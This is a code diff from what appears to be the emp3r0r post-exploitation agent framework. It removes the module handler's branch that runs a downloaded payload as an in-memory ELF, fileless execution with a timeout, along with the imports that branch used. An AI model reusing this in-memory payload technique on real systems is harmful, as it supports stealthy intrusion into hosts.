@@ -3,7 +3,6 @@ package modules
 import (
 	"fmt"
 	"os"
-	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
@@ -12,7 +11,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
-	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -66,29 +64,6 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 			return logging.Sprintf("running COFF module: %v", err)
 		}
 		return out
-	case "elf":
-		outChan := make(chan string)
-		go func() {
-			err = util.FileAllocate(os.Args[0], 0)
-			if err != nil {
-				outChan <- logging.Sprintf("FileAllocate: %v", err)
-				return
-			}
-			// if you need to pass arguments to the in-memory module, you can do it in environment variables
-			// when implementing the module, you can read the arguments from env
-			out, err = exeutil.InMemExeRun(payload_data, []string{os.Args[0]}, nil)
-			if err != nil {
-				out = logging.Sprintf("InMemExeRun: %v", err)
-			}
-			outChan <- logging.Sprintf("Success\n%s", out)
-		}()
-		select {
-		case out = <-outChan:
-			return out
-		case <-time.After(10 * time.Second):
-			out = "Timeout while waiting for in-memory module to print output"
-			return out
-		}
 	default:
 		return logging.Sprintf("unknown payload type %s or custom loader not available", payload_type)
 	}
